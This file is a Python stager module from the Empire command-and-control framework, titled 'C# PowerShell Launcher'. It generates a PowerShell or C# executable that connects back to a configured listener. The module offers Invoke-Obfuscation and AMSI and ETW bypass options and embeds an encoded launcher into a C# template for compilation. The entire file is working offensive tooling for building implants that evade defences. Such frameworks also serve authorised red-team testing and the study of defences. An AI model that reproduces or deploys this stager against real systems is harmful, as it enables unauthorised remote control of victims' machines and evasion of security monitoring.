from __future__ import print_function
from builtins import object
from empire.server.common import helpers
import shutil


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'C# PowerShell Launcher',

            'Author': ['@elitest', '@hubbl3'],

            'Description': 'Generate a PowerShell C#  solution with embedded stager code that compiles to an exe',

            'Comments': [
                'Based on the work of @bneg'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Language': {
                'Description': 'Language of the stager to generate (powershell, csharp).',
                'Required': True,
                'Value': 'csharp',
                'SuggestedValues': ['powershell', 'csharp'],
                'Strict': True
            },
            'DotNetVersion': {
                'Description': 'Language of the stager to generate(powershell, csharp).',
                'Required': True,
                'Value': 'net40',
                'SuggestedValues': ['net35', 'net40'],
                'Strict': True
            },
            'Listener': {
                'Description': 'Listener to use.',
                'Required': True,
                'Value': ''
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output.',
                'Required': True,
                'Value': 'Sharpire.exe'
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'Bypasses': {
                'Description': 'Bypasses as a space separated list to be prepended to the launcher',
                'Required': False,
                'Value': 'mattifestation etw'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        self.options.pop('Output', None)  # clear the previous output
        # staging options
        language = self.options['Language']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        listener_name = self.options['Listener']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        dot_net_version = self.options['DotNetVersion']['Value']

        bypasses = ''
        if language.lower() == 'powershell':
            bypasses = self.options['Bypasses']['Value']
            obfuscate = self.options['Obfuscate']['Value']
            obfuscate_command = self.options['ObfuscateCommand']['Value']
            outfile = self.options['OutFile']['Value']

            if not self.mainMenu.listeners.is_listener_valid(listener_name):
                # not a valid listener, return nothing for the script
                print(helpers.color("[!] Invalid listener: " + listener_name))
                return ""
            else:
                obfuscate_script = False
                if obfuscate.lower() == "true":
                    obfuscate_script = True

                if obfuscate_script and "launcher" in obfuscate_command.lower():
                    print(helpers.color(
                        "[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the C# stager."))
                    return ""

                # generate the PowerShell one-liner with all of the proper options set
                launcher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, encode=True,
                                                                   obfuscate=obfuscate_script,
                                                                   obfuscationCommand=obfuscate_command,
                                                                   userAgent=user_agent, proxy=proxy,
                                                                   proxyCreds=proxy_creds, stagerRetries=stager_retries,
                                                                   bypasses=bypasses)

                if launcher == "":
                    print(helpers.color("[!] Error in launcher generation."))
                    return ""
                else:
                    launcher_code = launcher.split(" ")[-1]

                    directory = self.mainMenu.installPath + "/data/misc/cSharpTemplateResources/cmd/"
                    dest_directory = "/tmp/cmd/"

                    # copy directory and create zip with launcher
                    shutil.copytree(directory, dest_directory)
                    lines = open(dest_directory + 'cmd/Program.cs').read().splitlines()
                    lines[19] = "\t\t\tstring stager = \"" + launcher_code + "\";"
                    open(dest_directory + 'cmd/Program.cs', 'w').write('\n'.join(lines))
                    shutil.make_archive(outfile, 'zip', dest_directory)
                    shutil.rmtree(dest_directory)

                    return f"[*] Zip file saved to {self.mainMenu.installPath}/{outfile}"

        elif language.lower() == 'csharp':
            launcher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, encode=False,
                                                               userAgent=user_agent, proxy=proxy,
                                                               proxyCreds=proxy_creds,
                                                               stagerRetries=stager_retries,
                                                               bypasses=bypasses)

            if not launcher or launcher.lower() == "failed":
                print(helpers.color("[!] Error in launcher command generation."))
                return ""
            else:
                directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{launcher}.exe"
                f = open(directory, 'rb')
                code = f.read()
                f.close()
                return code

        else:
            return "[!] Invalid launcher language."
